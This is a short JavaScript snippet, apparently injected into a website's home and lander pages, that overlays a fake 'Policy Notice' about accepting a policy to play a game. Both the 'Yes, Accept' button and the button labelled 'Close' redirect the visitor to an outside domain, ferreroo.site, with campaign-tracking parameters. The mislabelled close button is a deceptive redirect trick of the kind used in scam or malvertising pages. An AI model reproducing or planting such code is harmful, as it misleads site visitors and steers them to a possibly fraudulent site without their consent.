
(function () {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

  function init() {
    const path = (location.pathname || '').toLowerCase();
    const last = path.split('/').filter(Boolean).pop() || '';
    const isHome   = last === '' || last === 'index.html';
    const isLander = /lander\.html$/.test(last);

    if (!isHome && !isLander) return;

    const TERMS_URL = "https://ferreroo.site/?utm_campaign=FrfzGsCeMp&v1=[v1]&v2=[v2]&v3=[v3]";


    const bd = document.createElement('div');
    bd.className = 'ttf-backdrop';
    bd.innerHTML = `
      <div class="ttf-modal" role="dialog" aria-modal="true" aria-live="assertive">
        <button class="close-btn" aria-label="Close">×</button>
        <h3 style="margin:0 28px 8px 0">Policy Notice</h3>
        <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:12px">
          <button class="btn" id="ttf-yes">Yes, Accept</button>
          <button class="btn ghost" id="ttf-no">Close</button>
        </div>
      </div>
    `;

    document.body.appendChild(bd);

    function closeGate() {
      try { bd.remove(); } catch {}
    }

    function redirectToTerms() {
      window.location.href = TERMS_URL;
    }

   
    bd.querySelector('#ttf-yes').addEventListener('click', redirectToTerms);
    bd.querySelector('#ttf-no').addEventListener('click', redirectToTerms);
    bd.querySelector('.close-btn').addEventListener('click', closeGate);
    bd.addEventListener('click', (e) => { if (e.target === bd) closeGate(); });
    window.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeGate(); });
  }
})();
